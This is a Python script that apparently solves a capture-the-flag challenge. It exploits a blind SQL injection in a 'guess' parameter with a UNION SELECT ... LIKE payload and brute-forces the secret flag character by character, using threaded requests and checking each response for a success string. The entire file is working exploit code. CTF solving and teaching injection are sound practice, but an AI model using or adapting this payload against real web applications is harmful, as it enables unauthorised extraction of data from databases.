import requests
import concurrent.futures

url = "https://bluehens-blindsql.chals.io/index.php?guess=1 UNION SELECT 1 FROM secret where flag like '" 

charset = "abcdefghijklmnopqrstuvwxyz0123456789_!@#$%^&*()-=+{}[]|;:'\",.<>?/`~"

flag = "UDCTF{"

def check_character(char):
    payload = f"{url}{flag}{char}%'"
    response = requests.get(payload)
    return "Good guess!" in response.text

with concurrent.futures.ThreadPoolExecutor() as executor:
    while True:
        futures = [executor.submit(check_character, char) for char in charset]
        concurrent.futures.wait(futures)
        
        found = False
        for char, future in zip(charset, futures):
            if future.result():
                flag += char
                found = True
                print(flag)
                break
        
        if not found or flag[-1] == "}":
            break

print("Flag:", flag)
